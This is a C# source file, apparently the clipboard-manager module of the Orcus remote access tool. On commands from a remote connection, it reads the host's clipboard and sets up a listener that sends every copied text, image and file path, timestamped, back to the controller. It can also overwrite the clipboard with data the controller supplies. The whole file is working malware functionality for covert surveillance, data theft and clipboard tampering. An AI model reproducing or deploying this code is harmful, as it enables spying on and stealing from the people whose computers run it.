using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using Orcus.Extensions;
using Orcus.Plugins;
using Orcus.Shared.Commands.ClipboardManager;
using Orcus.Shared.NetSerializer;
using Orcus.Utilities;

namespace Orcus.Commands.ClipboardManager
{
    public class ClipboardManagerCommand : Command
    {
        private const int BitmapHeight = 200;
        private IConnectionInfo _connectionInfo;

        private readonly Lazy<Serializer> _clipboardSerializer = new Lazy<Serializer>(() =>
            new Serializer(new[]
            {
                typeof(ClipboardInfo), typeof(StringClipboardData), typeof(StringListClipboardData),
                typeof(ImageClipboardData)
            }));

        public override void Dispose()
        {
            base.Dispose();
            ClipboardNotification.ClipboardUpdate -= ClipboardNotificationOnClipboardUpdate;
        }

        public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
        {
            switch ((ClipboardManagerCommunication) parameter[0])
            {
                case ClipboardManagerCommunication.GetCurrentClipboard:
                    var thread = new Thread(() =>
                    {
                        var dataObject = Clipboard.GetDataObject();
                        if (dataObject == null)
                        {
                            ResponseByte((byte) ClipboardManagerCommunication.ResponseClipboardEmpty, connectionInfo);
                            return;
                        }
                        SendClipboardUpdate(ClipboardNotification.GetClipboardFormat(dataObject), dataObject,
                            connectionInfo);
                    });
                    thread.SetApartmentState(ApartmentState.STA); //important, else the clipboard Data is null
                    thread.Start();
                    break;
                case ClipboardManagerCommunication.StartListener:
                    _connectionInfo = connectionInfo;
                    ClipboardNotification.ClipboardUpdate += ClipboardNotificationOnClipboardUpdate;
                    break;
                case ClipboardManagerCommunication.StopListener:
                    ClipboardNotification.ClipboardUpdate -= ClipboardNotificationOnClipboardUpdate;
                    break;
                case ClipboardManagerCommunication.ChangeClipboard:
                    var clipboardData = _clipboardSerializer.Value.Deserialize<ClipboardData>(parameter, 1);

                    thread = new Thread(() =>
                    {
                        IDataObject dataObject = new DataObject();

                        if (!SetDataObjectData(clipboardData, dataObject))
                        {
                            var imageData = clipboardData as ImageClipboardData;
                            if (imageData != null)
                            {
                                //important, else we have a problem with disposing the image
                                using (var memoryStream = new MemoryStream(imageData.BitmapData))
                                {
                                    using (var bitmap = Image.FromStream(memoryStream))
                                    {
                                        dataObject.SetData(clipboardData.ClipboardFormat.ToString(), false, bitmap);
                                        Clipboard.SetDataObject(dataObject, true);
                                    }
                                }
                                return;
                            }
                        }

                        Clipboard.SetDataObject(dataObject, true);
                        ResponseByte((byte) ClipboardManagerCommunication.ResponseClipboardChangedSuccessfully,
                            connectionInfo);
                    });
                    thread.SetApartmentState(ApartmentState.STA); //important, else that doesn't work
                    thread.Start();
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        private bool SetDataObjectData(ClipboardData clipboardData, IDataObject dataObject)
        {
            var stringArrayData = clipboardData as StringListClipboardData;
            if (stringArrayData != null)
            {
                dataObject.SetData(clipboardData.ClipboardFormat.ToString(), false,
                    stringArrayData.StringList.Select(x => x.Value).ToArray());
                return true;
            }

            var stringData = clipboardData as StringClipboardData;
            if (stringData != null)
            {
                dataObject.SetData(clipboardData.ClipboardFormat.ToString(), false, stringData.Text);
                return true;
            }

            return false;
        }

        private void ClipboardNotificationOnClipboardUpdate(ClipboardFormat? format, IDataObject data)
        {
            SendClipboardUpdate(format, data, _connectionInfo);
        }

        private void SendClipboardUpdate(ClipboardFormat? format, IDataObject data, IConnectionInfo connectionInfo)
        {
            var clipboardInfo = new ClipboardInfo {Timestamp = DateTime.UtcNow};

            if (data.GetDataPresent(DataFormats.Bitmap, true))
            {
                using (var bitmap = data.GetData(DataFormats.Bitmap) as Image)
                {
                    if (bitmap != null)
                        using (var memoryStream = new MemoryStream())
                        {
                            if (bitmap.Height > BitmapHeight)
                                using (
                                    var resizedBitmap =
                                        bitmap.ResizeImage((int) ((float) bitmap.Width / bitmap.Height * BitmapHeight),
                                            BitmapHeight))
                                    resizedBitmap.Save(memoryStream, ImageFormat.Jpeg);
                            else
                                bitmap.Save(memoryStream, ImageFormat.Jpeg);


                            clipboardInfo.Data = new ImageClipboardData(memoryStream.ToArray(), bitmap.Width,
                                bitmap.Height, format ?? ClipboardFormat.Bitmap);
                        }
                    else
                        clipboardInfo.Data = new ImageClipboardData(null, 0, 0, format ?? ClipboardFormat.Bitmap);
                }
            }
            else if (data.GetDataPresent(DataFormats.Text, true)) //that includes also UnicodeText, Rtf, Html, CommaSeparatedValue
            {
                clipboardInfo.Data = new StringClipboardData(data.GetData(DataFormats.Text, true) as string,
                    format ?? ClipboardFormat.Text);
            }
            else if (data.GetDataPresent(DataFormats.FileDrop, true))
            {
                clipboardInfo.Data =
                    new StringListClipboardData(
                        (data.GetData(DataFormats.FileDrop) as string[])?.Select(x => new StringListEntry {Value = x}).ToList() ?? new List<StringListEntry>(),
                        format ?? ClipboardFormat.FileDrop);
            }
            else
            {
                clipboardInfo.Data = new ClipboardData(format ?? (ClipboardFormat) byte.MaxValue);
            }

            ResponseBytes((byte) ClipboardManagerCommunication.ResponseClipboardChanged,
                _clipboardSerializer.Value.Serialize(clipboardInfo), connectionInfo);
        }

        protected override uint GetId()
        {
            return 35;
        }
    }
}